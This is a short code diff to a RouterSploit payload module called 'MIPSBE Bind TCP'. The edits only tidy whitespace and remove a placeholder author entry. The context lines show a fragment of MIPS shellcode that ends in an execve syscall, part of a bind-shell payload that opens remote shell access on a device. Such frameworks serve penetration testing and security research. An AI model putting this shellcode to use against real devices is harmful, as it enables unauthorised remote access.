@@ -4,13 +4,13 @@ from routersploit import (
     validators
 )
 
+
 class Exploit(payloads.Payload):
     __info__ = {
         'name': 'MIPSBE Bind TCP',
         'authors': [
-			'Test',
         ],
-        'description': '', 
+        'description': '',
         'references': [
         ],
     }
@@ -94,4 +94,3 @@ class Exploit(payloads.Payload):
             "\x24\x02\x0f\xab" +        # li v0,4011 ( __NR_execve )
             "\x01\x01\x01\x0c"          # syscall 0x40404
         )
-
